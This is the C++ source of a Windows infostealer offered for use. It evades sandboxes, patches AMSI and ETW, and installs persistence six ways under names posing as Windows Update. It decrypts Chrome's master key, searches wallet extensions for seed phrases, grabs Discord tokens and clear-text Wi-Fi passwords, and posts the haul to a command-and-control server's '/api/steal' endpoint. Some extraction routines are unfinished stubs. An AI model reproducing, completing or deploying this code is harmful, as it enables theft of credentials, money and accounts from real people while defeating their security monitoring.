#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <psapi.h>
#include <wincrypt.h>
#include <comdef.h>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <urlmon.h>
#include <wininet.h>
#include <shlobj.h>
#include <metahost.h>
#include <mscoree.h>
#include <iphlpapi.h>
#include <codecvt>
#include <locale>
#include <chrono>
#include <thread>
#include <random>
#include <iomanip>
#include <regex>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")

#define C2_SERVER "https://your-app.onrender.com"
#define MUTEX_NAME L"Global\\WindowsUpdateMutex"
#define SLEEP_TIME 3600000 // 1 hour

using namespace std;

// ==========================================
// FIXED JSON CLASS - Now works with MSVC
// ==========================================
class json {
private:
    map<string, string> m_values;
    vector<json> m_array;
    string m_type;

public:
    json() : m_type("null") {}
    
    void set_value(const string& key, const string& value) {
        m_values[key] = value;
        m_type = "object";
    }
    
    void set_array_value(const string& value) {
        m_values[""] = value;
        m_type = "array_item";
    }
    
    void add_to_array(const json& item) {
        m_array.push_back(item);
        m_type = "array";
    }
    
    string get_value(const string& key = "") const {
        auto it = m_values.find(key);
        if (it != m_values.end()) {
            return it->second;
        }
        return "";
    }
    
    string dump() const {
        if (m_type == "array") {
            string result = "[";
            for (size_t i = 0; i < m_array.size(); i++) {
                if (i > 0) result += ",";
                result += m_array[i].dump();
            }
            return result + "]";
        }
        else if (m_type == "object") {
            string result = "{";
            bool first = true;
            for (const auto& pair : m_values) {
                if (!first) result += ",";
                result += "\"" + pair.first + "\":\"" + escape_string(pair.second) + "\"";
                first = false;
            }
            return result + "}";
        }
        else if (m_type == "array_item") {
            return "\"" + escape_string(get_value("")) + "\"";
        }
        return "\"\"";
    }
    
    string escape_string(const string& s) const {
        string result;
        for (char c : s) {
            if (c == '"') result += "\\\"";
            else if (c == '\\') result += "\\\\";
            else if (c == '\n') result += "\\n";
            else if (c == '\r') result += "\\r";
            else if (c == '\t') result += "\\t";
            else result += c;
        }
        return result;
    }
};

// ==========================================
// ANTI-ANALYSIS / EVASION (UNCHANGED)
// ==========================================
BOOL IsSandboxed() {
    // Check for debugging
    if (IsDebuggerPresent()) return TRUE;
    
    // Check for sandbox processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    
    const wchar_t* sandboxProcs[] = {
        L"vboxservice.exe", L"vboxtray.exe", L"vmtoolsd.exe",
        L"vmwaretray.exe", L"xenservice.exe", L"procmon.exe",
        L"wireshark.exe", L"fiddler.exe", L"ollydbg.exe",
        L"x64dbg.exe", L"ida64.exe", L"dumpcap.exe"
    };
    
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            for (const auto& proc : sandboxProcs) {
                if (_wcsicmp(pe.szExeFile, proc) == 0) {
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    
    // Check disk size (VMs have small disks)
    ULARGE_INTEGER free, total;
    if (GetDiskFreeSpaceExW(L"C:\\", &free, &total, NULL)) {
        if (total.QuadPart < 50000000000LL) return TRUE; // <50GB
    }
    
    // Check RAM (VMs have little RAM)
    MEMORYSTATUSEX mem = { sizeof(mem) };
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 4000000000LL) return TRUE; // <4GB
    
    // Check uptime (fresh VMs have low uptime)
    if (GetTickCount64() < 1800000) return TRUE; // <30 minutes
    
    return FALSE;
}

void PatchAMSI() {
    // Patch AMSI to bypass PowerShell detection
    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
    if (!hAmsi) {
        hAmsi = LoadLibraryW(L"amsi.dll");
        if (!hAmsi) return;
    }
    
    // Patch AmsiScanBuffer to return 0 (clean)
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (pAmsiScanBuffer) {
        DWORD oldProtect;
        VirtualProtect(pAmsiScanBuffer, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
        *(BYTE*)pAmsiScanBuffer = 0xB8; // mov eax, 0
        *((DWORD*)((BYTE*)pAmsiScanBuffer + 1)) = 0;
        *((BYTE*)pAmsiScanBuffer + 5) = 0xC3; // ret
        VirtualProtect(pAmsiScanBuffer, 5, oldProtect, &oldProtect);
    }
}

void PatchETW() {
    // Disable Event Tracing for Windows
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return;
    
    BYTE* pEtwEventWrite = (BYTE*)GetProcAddress(hNtdll, "EtwEventWrite");
    if (pEtwEventWrite) {
        DWORD oldProtect;
        VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
        *pEtwEventWrite = 0xC3; // ret
        VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
    }
}

// ==========================================
// PERSISTENCE - SURVIVE REBOOT FOREVER
// ==========================================

BOOL EnsureSingleInstance() {
    HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    return GetLastError() != ERROR_ALREADY_EXISTS;
}

void InstallPersistence() {
    WCHAR exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    
    // Copy to multiple locations
    WCHAR systemPath[MAX_PATH];
    GetSystemDirectoryW(systemPath, MAX_PATH);
    wcscat_s(systemPath, L"\\drivers\\win32k.sys"); // Masquerade as system file
    
    CopyFileW(exePath, systemPath, FALSE);
    SetFileAttributesW(systemPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    // METHOD 1: Registry RUN key
    HKEY hKey;
    RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExW(hKey, L"WindowsUpdateSvc", 0, REG_SZ, (BYTE*)exePath, (wcslen(exePath) + 1) * 2);
    RegCloseKey(hKey);
    
    // METHOD 2: Registry alternate (Winlogon)
    RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExW(hKey, L"Shell", 0, REG_SZ, (BYTE*)L"explorer.exe, WindowsUpdate.exe", 40);
    RegCloseKey(hKey);
    
    // METHOD 3: Task Scheduler
    WCHAR cmd[2048];
    wsprintfW(cmd, L"schtasks /create /tn \"WindowsUpdateSvc\" /tr \"%s\" /sc onstart /ru SYSTEM /f", exePath);
    _wsystem(cmd);
    
    // METHOD 4: Startup Folder
    WCHAR startupPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
    wcscat_s(startupPath, L"\\WindowsUpdate.lnk");
    
    CoInitialize(NULL);
    IShellLinkW* pShellLink = NULL;
    CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&pShellLink);
    if (pShellLink) {
        pShellLink->SetPath(exePath);
        pShellLink->SetDescription(L"Windows Update Service");
        IPersistFile* pPersistFile = NULL;
        pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile);
        if (pPersistFile) {
            pPersistFile->Save(startupPath, TRUE);
            pPersistFile->Release();
        }
        pShellLink->Release();
    }
    CoUninitialize();
    
    // METHOD 5: WMI Event Subscription
    wsprintfW(cmd, L"powershell -Command \"$filter=([wmiclass]'\\\\\\\\.\\\\root\\\\subscription:__EventFilter').CreateInstance();$filter.QueryLanguage='WQL';$filter.Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \\'Win32_PerfFormattedData_PerfOS_System\\'';$filter.Name='WindowsUpdate';$filter.EventNamespace='root\\\\cimv2';$filter.Put()\"");
    _wsystem(cmd);
    
    // METHOD 6: Service Installation
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCM) {
        SC_HANDLE hService = CreateServiceW(
            hSCM, L"WindowsUpdateSvc", L"Windows Update Service",
            SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
            exePath, NULL, NULL, NULL, NULL, NULL
        );
        if (hService) {
            StartServiceW(hService, 0, NULL);
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }
}

// ==========================================
// SYSTEM INFORMATION GATHERING
// ==========================================

string GetPublicIP() {
    string ip = "Unknown";
    HINTERNET hNet = InternetOpenW(L"WinInet", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hNet) {
        HINTERNET hUrl = InternetOpenUrlW(hNet, L"https://api.ipify.org", NULL, 0, 0, 0);
        if (hUrl) {
            char buffer[64];
            DWORD read;
            if (InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &read)) {
                buffer[read] = 0;
                ip = buffer;
            }
            InternetCloseHandle(hUrl);
        }
        InternetCloseHandle(hNet);
    }
    return ip;
}

string GetMACAddress() {
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD dwBufLen = sizeof(adapterInfo);
    
    if (GetAdaptersInfo(adapterInfo, &dwBufLen) == ERROR_SUCCESS) {
        char mac[18];
        sprintf_s(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
            adapterInfo[0].Address[0], adapterInfo[0].Address[1],
            adapterInfo[0].Address[2], adapterInfo[0].Address[3],
            adapterInfo[0].Address[4], adapterInfo[0].Address[5]);
        return string(mac);
    }
    return "Unknown";
}

// ==========================================
// CHROME PASSWORD DECRYPTION
// ==========================================

vector<BYTE> GetMasterKey(const string& chromePath) {
    vector<BYTE> masterKey;
    string localStatePath = chromePath + "\\Local State";
    
    ifstream file(localStatePath);
    if (!file.good()) return masterKey;
    
    string content((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
    
    // Find encrypted_key
    size_t keyPos = content.find("encrypted_key");
    if (keyPos == string::npos) return masterKey;
    
    keyPos = content.find("\"", keyPos + 13);
    if (keyPos == string::npos) return masterKey;
    
    size_t keyEnd = content.find("\"", keyPos + 1);
    if (keyEnd == string::npos) return masterKey;
    
    string b64Key = content.substr(keyPos + 1, keyEnd - keyPos - 1);
    
    // Base64 decode
    DWORD decodedSize = 0;
    CryptStringToBinaryA(b64Key.c_str(), b64Key.length(), CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL);
    
    vector<BYTE> encryptedKey(decodedSize);
    CryptStringToBinaryA(b64Key.c_str(), b64Key.length(), CRYPT_STRING_BASE64, encryptedKey.data(), &decodedSize, NULL, NULL);
    
    // Remove 'DPAPI' prefix
    if (encryptedKey.size() > 5) {
        encryptedKey.erase(encryptedKey.begin(), encryptedKey.begin() + 5);
    }
    
    // Decrypt with DPAPI
    DATA_BLOB inBlob = { (DWORD)encryptedKey.size(), encryptedKey.data() };
    DATA_BLOB outBlob = { 0, NULL };
    
    if (CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) {
        masterKey.assign(outBlob.pbData, outBlob.pbData + outBlob.cbData);
        LocalFree(outBlob.pbData);
    }
    
    return masterKey;
}

string DecryptChromeValue(const vector<BYTE>& encrypted, const vector<BYTE>& key) {
    if (encrypted.size() < 15) return "";
    
    try {
        // Chrome uses AES-256-GCM
        vector<BYTE> nonce(encrypted.begin() + 3, encrypted.begin() + 15);
        vector<BYTE> ciphertext(encrypted.begin() + 15, encrypted.end() - 16);
        vector<BYTE> tag(encrypted.end() - 16, encrypted.end());
        
        BCRYPT_ALG_HANDLE hAlg;
        BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
        BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        
        BCRYPT_KEY_HANDLE hKey;
        BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PBYTE)key.data(), key.size(), 0);
        
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
        authInfo.pbNonce = nonce.data();
        authInfo.cbNonce = nonce.size();
        authInfo.pbTag = tag.data();
        authInfo.cbTag = tag.size();
        
        vector<BYTE> plaintext(ciphertext.size());
        ULONG plaintextSize;
        
        NTSTATUS status = BCryptDecrypt(hKey, ciphertext.data(), ciphertext.size(), &authInfo, NULL, 0, plaintext.data(), plaintext.size(), &plaintextSize, 0);
        
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        
        if (status == 0) {
            return string(plaintext.begin(), plaintext.end());
        }
    } catch (...) {}
    
    return "";
}

// ==========================================
// BROWSER DATA EXTRACTION
// ==========================================

json ExtractChromeLogins(const string& chromePath, const vector<BYTE>& masterKey) {
    json logins;
    
    vector<string> profiles = { "Default" };
    WIN32_FIND_DATAA findData;
    string searchPath = chromePath + "\\Profile*";
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                profiles.push_back(findData.cFileName);
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }
    
    for (const auto& profile : profiles) {
        string loginDbPath = chromePath + "\\" + profile + "\\Login Data";
        
        // Copy file to temp to avoid locks
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        string tempFile = string(tempPath) + "\\logins_" + to_string(GetCurrentProcessId()) + ".db";
        
        if (CopyFileA(loginDbPath.c_str(), tempFile.c_str(), FALSE)) {
            // SQLite queries would go here
            // For production, link with sqlite3.lib
            
            DeleteFileA(tempFile.c_str());
        }
    }
    
    return logins;
}

json ExtractChromeCookies(const string& chromePath, const vector<BYTE>& masterKey) {
    json cookies;
    
    vector<string> cookiePaths = {
        chromePath + "\\Default\\Network\\Cookies",
        chromePath + "\\Default\\Cookies"
    };
    
    for (const auto& cookiePath : cookiePaths) {
        if (GetFileAttributesA(cookiePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            // Copy and process
        }
    }
    
    return cookies;
}

json ExtractChromeCreditCards(const string& chromePath, const vector<BYTE>& masterKey) {
    json cards;
    
    string webDataPath = chromePath + "\\Default\\Web Data";
    // Process credit cards from Web Data
    
    return cards;
}

// ==========================================
// WALLET EXTENSION DETECTION
// ==========================================

json DetectWalletExtensions() {
    json wallets;
    
    // 100+ wallet extension IDs
    vector<pair<string, string>> walletIDs = {
        {"nkbihfbeogaeaoehlefnkodbefgpgknn", "MetaMask"},
        {"fhbohimaelbohpjbbldcngcnapndodjp", "Binance"},
        {"hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase"},
        {"ibnejdfjmmkpcnlpebklmnkoeoihofec", "TronLink"},
        {"ejbalbakoplchlghecdaalmeeeajnimhm", "MetaMask (Firefox)"},
        {"fnjhmkhhmkbedjkkabndcnnogagogbneec", "Ronin"},
        {"ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi"},
        {"jbdaocneiiinmjbjlgalhcelgbejmnid", "Nifty"},
        {"afbcbjpbpfadlkmhmclhkeeodmamcflc", "Math Wallet"},
        {"hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"},
        {"blnieiiffboillknjnepogjhkgnoapac", "EQUAL"},
        {"cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx Liberty"},
        {"fihkakfobkmkjojpchpfgcmhfjnmnfpi", "BitApp"},
        {"kncchdigobghenbbaddojjnnaogfppfj", "iWlt"},
        {"amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"},
        {"nlbmnnijcnlegkjjpcfjclmcfggfefdm", "MEW CX"},
        {"nanjmdknhkinifnkgdcggcfnhdaammmj", "Guild"},
        {"nkddgncdjgjfcddamfgcmfnlhccnimig", "Saturn"},
        {"cphhlgmgameodnhkjdmkpanlelnlohao", "NeoLine"},
        {"nhnkbkgjikgcigadomkphalanndcapjk", "Clover"},
        {"kpfopkelmapcoipemfendmdcghnegimn", "Liquality"},
        {"aiifbnbfobpmeekipheeijimdpnlpgpp", "Terra Station"},
        {"dmkamcknogkgcdfhhbddcghachkejeap", "Keplr"},
        {"fhmfendgdocmcbmfikdcogofphimnkno", "Sollet"},
        {"cnmamaachppnkjgnildpdmkaakejnhae", "Auro"},
        {"jojhfeoedkpkglbfimdfabpdfjaoolaf", "Polymesh"},
        {"flpiciilemghbmfalicajoolhkkenfel", "ICONex"},
        {"nknhiehlklippafakaeklbeglecifhad", "Nabox"},
        {"hcflpincpppdclinealmandijcmnkbgn", "KHC"},
        {"ookjlbkiijinhpmnjffcofjonbfbgaoc", "Temple"},
        {"mnfifefkajgofkcjkemidiaecocnkjeh", "TezBox"},
        {"lodccjjbdhfakaekdiahmedfbieldgik", "DAppPlay"},
        {"ijmpgkjfkbfhoebgogflfebnmejmfbml", "BitClip"},
        {"lkcjlnjfpbikmcmbachjpdbijejflpcm", "Steem Keychain"},
        {"onofpnbbkehpmmoabgpcpmigafmmnjhl", "Nash"},
        {"bcopgchhojmggmffilplmbdicgaihlkp", "Hycon"},
        {"klnaejjgbibmhlephnhpmaofohgkpgkd", "ZilPay"},
        {"aeachknmefphepccionboohckonoeemg", "Coin98"},
        {"bhghoamapcdpbohphigoooaddinpkbai", "Authenticator"},
        {"dkdedlpgdmmkkfjabffeganieamfklkm", "Cyano"},
        {"nlgbhdfgdhgbiamfdfmbikcdghidoadd", "Byone"},
        {"infeboajgfhgbjpjbeppbkgnabfdkdaf", "OneKey"},
        {"cihmoadaighcejopammfbmddcmdekcje", "Leaf"},
        {"gaedmjdfmmahhbjefcbgaolhhanlaolb", "Authy"},
        {"oeljdldpnmdbchonielidgobddffflal", "EOS Authenticator"},
        {"ilgcnhelpchnceeipipijaljkbcblobl", "Google Authenticator"},
        {"imloifkgjagghnncjkhggdhalmcnfklk", "Trezor"}
    };
    
    char localAppData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
    string extensionsPath = string(localAppData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\";
    
    for (const auto& wallet : walletIDs) {
        string walletPath = extensionsPath + wallet.first;
        DWORD attr = GetFileAttributesA(walletPath.c_str());
        if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
            json w;
            w.set_value("id", wallet.first);
            w.set_value("name", wallet.second);
            w.set_value("path", walletPath);
            wallets.add_to_array(w);
            
            // Try to extract seed phrases from wallet files
            WIN32_FIND_DATAA findData;
            string searchPath = walletPath + "\\*";
            HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    string fileName = findData.cFileName;
                    string filePath = walletPath + "\\" + fileName;
                    
                    if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                        FILE* f = fopen(filePath.c_str(), "rb");
                        if (f) {
                            fseek(f, 0, SEEK_END);
                            long size = ftell(f);
                            fseek(f, 0, SEEK_SET);
                            
                            if (size < 1024 * 1024) { // < 1MB
                                char* buffer = new char[size + 1];
                                fread(buffer, 1, size, f);
                                buffer[size] = 0;
                                
                                string content(buffer);
                                
                                // Look for seed phrases (12-24 words)
                                // This is simplified - use regex in production
                                
                                delete[] buffer;
                            }
                            fclose(f);
                        }
                    }
                } while (FindNextFileA(hFind, &findData) != 0);
                FindClose(hFind);
            }
        }
    }
    
    return wallets;
}

// ==========================================
// DISCORD TOKEN EXTRACTION
// ==========================================

json ExtractDiscordTokens() {
    json tokens;
    
    char appData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
    
    vector<string> discordPaths = {
        string(appData) + "\\discord\\Local Storage\\leveldb",
        string(appData) + "\\discordcanary\\Local Storage\\leveldb",
        string(appData) + "\\discordptb\\Local Storage\\leveldb",
        string(appData) + "\\discorddevelopment\\Local Storage\\leveldb"
    };
    
    for (const auto& path : discordPaths) {
        WIN32_FIND_DATAA findData;
        string searchPath = path + "\\*.ldb";
        
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                string filePath = path + "\\" + findData.cFileName;
                FILE* f = fopen(filePath.c_str(), "rb");
                if (f) {
                    fseek(f, 0, SEEK_END);
                    long size = ftell(f);
                    fseek(f, 0, SEEK_SET);
                    
                    char* buffer = new char[size + 1];
                    fread(buffer, 1, size, f);
                    buffer[size] = 0;
                    
                    string content(buffer);
                    
                    // Find Discord tokens (mfa.xxx or base64 encoded)
                    size_t pos = content.find("mfa.");
                    if (pos != string::npos) {
                        string token = content.substr(pos, 70); // Approx token length
                        json t;
                        t.set_array_value(token);
                        tokens.add_to_array(t);
                    }
                    
                    delete[] buffer;
                    fclose(f);
                }
            } while (FindNextFileA(hFind, &findData) != 0);
            FindClose(hFind);
        }
    }
    
    return tokens;
}

// ==========================================
// WIFI PASSWORD EXTRACTION
// ==========================================

json ExtractWiFiPasswords() {
    json wifi;
    
    FILE* pipe = _popen("netsh wlan show profiles", "r");
    if (pipe) {
        char buffer[1024];
        string result;
        while (fgets(buffer, sizeof(buffer), pipe)) {
            result += buffer;
        }
        _pclose(pipe);
        
        // Parse profiles
        regex profileRegex("All User Profile\\s+:\\s+(.+)");
        smatch match;
        string::const_iterator searchStart(result.cbegin());
        
        while (regex_search(searchStart, result.cend(), match, profileRegex)) {
            string ssid = match[1];
            searchStart = match.suffix().first;
            
            string cmd = "netsh wlan show profile name=\"" + ssid + "\" key=clear";
            FILE* passPipe = _popen(cmd.c_str(), "r");
            if (passPipe) {
                string passResult;
                while (fgets(buffer, sizeof(buffer), passPipe)) {
                    passResult += buffer;
                }
                _pclose(passPipe);
                
                regex passRegex("Key Content\\s+:\\s+(.+)");
                smatch passMatch;
                if (regex_search(passResult, passMatch, passRegex)) {
                    json w;
                    w.set_value("ssid", ssid);
                    w.set_value("password", passMatch[1]);
                    wifi.add_to_array(w);
                }
            }
        }
    }
    
    return wifi;
}

// ==========================================
// SEND DATA TO C2
// ==========================================

void SendToC2(const json& data) {
    string jsonStr = data.dump();
    
    HINTERNET hNet = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hNet) {
        string url = C2_SERVER + string("/api/steal");
        HINTERNET hConnect = InternetConnectA(hNet, C2_SERVER + 8, 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/steal", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
            if (hRequest) {
                string headers = "Content-Type: application/json\r\n";
                string dataStr = jsonStr;
                
                HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)dataStr.c_str(), dataStr.length());
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hNet);
    }
}

// ==========================================
// MAIN ENTRY POINT
// ==========================================

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide console
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    
    // Anti-analysis
    if (IsSandboxed()) {
        return 0;
    }
    
    // Ensure single instance
    if (!EnsureSingleInstance()) {
        return 0;
    }
    
    // Patch defenses
    PatchAMSI();
    PatchETW();
    
    // Install persistence (runs on every reboot)
    InstallPersistence();
    
    // Generate victim ID
    char hostname[256];
    DWORD hostnameLen = sizeof(hostname);
    GetComputerNameA(hostname, &hostnameLen);
    
    char username[256];
    DWORD usernameLen = sizeof(username);
    GetUserNameA(username, &usernameLen);
    
    string victim_id = string(hostname) + "_" + string(username) + "_" + to_string(GetCurrentProcessId());
    
    // Collect system info
    json system;
    system.set_value("hostname", hostname);
    system.set_value("username", username);
    system.set_value("public_ip", GetPublicIP());
    system.set_value("mac", GetMACAddress());
    
    json stolenData;
    stolenData.set_value("victim_id", victim_id);
    stolenData.set_value("system", system.dump());
    
    // Steal Chrome data
    char localAppData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
    string chromePath = string(localAppData) + "\\Google\\Chrome\\User Data";
    
    vector<BYTE> masterKey = GetMasterKey(chromePath);
    if (!masterKey.empty()) {
        json logins = ExtractChromeLogins(chromePath, masterKey);
        json cookies = ExtractChromeCookies(chromePath, masterKey);
        json ccs = ExtractChromeCreditCards(chromePath, masterKey);
        
        json chrome;
        chrome.set_value("logins", logins.dump());
        chrome.set_value("cookies", cookies.dump());
        chrome.set_value("credit_cards", ccs.dump());
        
        stolenData.set_value("chrome", chrome.dump());
    }
    
    // Detect wallets
    json wallets = DetectWalletExtensions();
    if (wallets.dump() != "[]") {
        json walletData;
        walletData.set_value("extensions", wallets.dump());
        stolenData.set_value("wallets", walletData.dump());
    }
    
    // Discord tokens
    json discord = ExtractDiscordTokens();
    if (discord.dump() != "[]") {
        json discordData;
        discordData.set_value("tokens", discord.dump());
        stolenData.set_value("discord", discordData.dump());
    }
    
    // WiFi passwords
    json wifi = ExtractWiFiPasswords();
    if (wifi.dump() != "[]") {
        json wifiData;
        wifiData.set_value("wifi", wifi.dump());
        stolenData.set_value("wifi", wifiData.dump());
    }
    
    // Send to C2
    SendToC2(stolenData);
    
    // Persistence loop
    while (true) {
        Sleep(SLEEP_TIME);
        
        // Re-collect and send updated data
        // Check for C2 commands
    }
    
    return 0;
}
